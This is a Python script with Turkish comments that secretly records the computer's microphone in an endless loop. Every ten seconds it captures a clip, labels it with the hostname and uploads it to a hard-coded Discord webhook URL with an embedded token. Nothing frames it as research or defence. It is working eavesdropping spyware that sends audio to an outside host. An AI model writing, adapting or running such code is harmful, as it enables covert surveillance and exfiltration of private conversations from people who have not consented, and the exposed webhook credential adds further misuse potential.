import sounddevice as sd
from scipy.io.wavfile import write
import os
import time
import requests
import socket

# Webhook URL'nizi burada belirtin
WEBHOOK_URL = "https://discord.com/api/webhooks/1382647055578828872/RC6OWqona8Zn16B4myCjzCR-nXDbt_Tdf432n_vGvmYkQzzYThJR6FjsOzy0_ldmeG2J"

# Ses kaydı ayarları
RECORD_SECONDS = 10  # 10 saniyelik kayıt süresi
SAMPLE_RATE = 44100  # Örnekleme oranı

# Bilgisayar adını al
computer_name = socket.gethostname()

def record_audio(filename="recording.wav"):
    try:
        print("...")
        recording = sd.rec(int(RECORD_SECONDS * SAMPLE_RATE), samplerate=SAMPLE_RATE, channels=1)  # Kanal sayısını 1 olarak ayarladık
        sd.wait()  # Kayıt tamamlanana kadar bekle
        write(filename, SAMPLE_RATE, recording)  # Ses dosyasını kaydet
        print("complete.")
        
        # Dosyanın varlığını kontrol et
        if os.path.exists(filename):
            print("tamamlandı.")
        else:
            print("error.")
            
    except Exception as e:
        print(f"hata: {e}")

def send_to_discord(filename):
    try:
        # Dosya var mı kontrol edelim
        if os.path.exists(filename):
            with open(filename, "rb") as f:
                response = requests.post(
                    WEBHOOK_URL,
                    files={"file": (f"{computer_name} - {filename}", f)},
                    data={"content": f"{computer_name} - Ses kaydı gönderiliyor..."}
                )
            print("Tamamlandı:", response.status_code)
        else:
            print("Gönderilecek dosya bulunamadı.")
    except Exception as e:
        print(f"bir hata oluştu: {e}")

try:
    while True:
        audio_file = "recording.wav"
        record_audio(audio_file)
        send_to_discord(audio_file)
        time.sleep(10)  # 10 saniye bekle ve yeniden kayda başla
except KeyboardInterrupt:
    print("Program durduruldu.")
except Exception as e:
    print(f"Beklenmeyen bir hata oluştu: {e}")